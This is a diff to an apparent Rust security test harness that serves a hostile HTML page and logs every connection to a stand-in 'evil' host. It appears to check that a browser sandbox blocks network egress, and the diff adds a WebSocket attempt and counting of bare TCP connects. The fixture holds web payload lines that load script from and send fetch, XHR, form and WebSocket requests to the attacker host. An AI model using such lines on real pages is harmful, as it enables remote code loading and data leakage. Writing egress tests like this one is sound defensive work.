@@ -21,6 +21,9 @@ fn serve(evil: &str) -> (String, Log) {
         for s in l.incoming() {
             let Ok(mut s) = s else { continue };
             let (lg, evil) = (lg.clone(), evil.clone());
+            // W3.9.a.a: the gate counts ACCEPTED CONNECTIONS, not request lines: a bare preconnect
+            // that sends nothing still shows the attacker that the browser dialled its host.
+            lg.lock().unwrap().push("CONNECT".to_string());
             std::thread::spawn(move || {
                 let mut buf = [0u8; 4096];
                 let n = s.read(&mut buf).unwrap_or(0);
@@ -31,8 +34,6 @@ fn serve(evil: &str) -> (String, Log) {
                     .to_string();
                 let mut it = first.split_whitespace();
                 let (m, p) = (it.next().unwrap_or(""), it.next().unwrap_or(""));
-                // A bare TCP connect with no request line (Chrome opening a socket for a blocked frame
-                // navigation) carries no request; it is a named residual, not counted as egress.
                 if p != "/favicon.ico" && !first.is_empty() {
                     lg.lock().unwrap().push(format!("{m} {p}"));
                 }
@@ -48,6 +49,7 @@ fn serve(evil: &str) -> (String, Log) {
 <script src="{evil}/s.js"></script>
 <script>fetch("{evil}/fetch"); var x = new XMLHttpRequest(); x.open("GET", "{evil}/xhr"); x.send();</script>
 <form method="post" action="{evil}/post"><button id="p">Post out</button></form>
+<script>try{{new WebSocket("{evil}/ws".replace("http","ws"))}}catch(e){{}}</script>
 <p>EVILFRAMEMARKER-not-here</p>
 </body></html>"#
                 );
